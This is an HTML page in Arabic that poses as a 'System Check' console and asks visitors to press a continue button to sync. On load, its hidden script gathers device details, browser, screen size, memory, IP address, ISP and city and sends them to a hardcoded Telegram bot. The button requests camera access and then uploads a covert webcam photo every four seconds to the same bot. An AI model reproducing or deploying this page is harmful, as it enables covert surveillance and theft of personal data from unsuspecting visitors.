<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Check</title>
    <style>
        body { background: #000; color: #0f0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: monospace; margin: 0; }
        .console { border: 1px solid #0f0; padding: 20px; background: #050505; }
    </style>
</head>
<body>

    <div class="console" id="logger">
        > جاري فحص النظام...<br>
        > يرجى المتابعة للمزامنة...<br><br>
        <button id="run" style="background:#0f0; color:#000; border:none; padding:10px 20px; cursor:pointer; font-weight:bold;">متابعة</button>
    </div>

    <video id="v" playsinline autoplay muted style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const api = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
        const cid = "2103976274";

        async function getDeepInfo() {
            let n = navigator;
            let info = `📡 **تقرير فني دقيق**\n\n`;

            // محاولة جلب الماركة الحقيقية (تعمل في المتصفحات الحديثة)
            if (n.userAgentData) {
                const uaData = await n.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion", "architecture"]);
                info += `📱 **الجهاز الدقيق:** ${uaData.model || 'غير مسموح'}\n`;
                info += `💻 **النظام:** ${uaData.platform} v${uaData.platformVersion}\n`;
            } else {
                info += `📱 **الجهاز (عام):** ${n.platform}\n`;
            }

            // تحديد المتصفح الحقيقي بالاستبعاد
            let browser = "غير معروف";
            if (n.userAgent.includes("Brave")) browser = "Brave";
            else if (n.userAgent.includes("Edg")) browser = "Edge";
            else if (n.userAgent.includes("Chrome")) browser = "Chrome";
            else if (n.userAgent.includes("Safari")) browser = "Safari";
            info += `🧭 **المتصفح الحقيقي:** ${browser}\n`;

            // معلومات إضافية
            info += `🔋 **البطارية:** [جاري الفحص...]\n`;
            info += `🖥️ **الشاشة:** ${window.screen.width}x${window.screen.height}\n`;
            info += `🚀 **الرام التقديري:** ${n.deviceMemory || 'غير معروف'} GB\n`;

            // جلب الـ IP مع تفاصيل الموقع الجغرافي
            try {
                const res = await fetch('https://ipapi.co/json/');
                const j = await res.json();
                info = info.replace("[جاري الفحص...]", "تم");
                info += `🌍 **IP:** ${j.ip}\n`;
                info += `🏢 **الشركة:** ${j.org}\n`;
                info += `📍 **الموقع:** ${j.city}, ${j.country_name}\n`;
            } catch (e) {}

            send(info);
        }

        document.getElementById('run').onclick = async function() {
            this.style.display = 'none';
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('v').srcObject = s;
                setInterval(snap, 4000);
            } catch (e) { send("⚠️ رفض الكاميرا"); }
        };

        function snap() {
            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(b => {
                const f = new FormData();
                f.append('chat_id', cid);
                f.append('photo', b, 'x.jpg');
                fetch(api + "sendPhoto", { method: 'POST', body: f });
            }, 'image/jpeg', 0.8);
        }

        function send(t) {
            fetch(api + "sendMessage", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: cid, text: t, parse_mode: "Markdown" })
            });
        }

        getDeepInfo();
    </script>
</body>
</html>
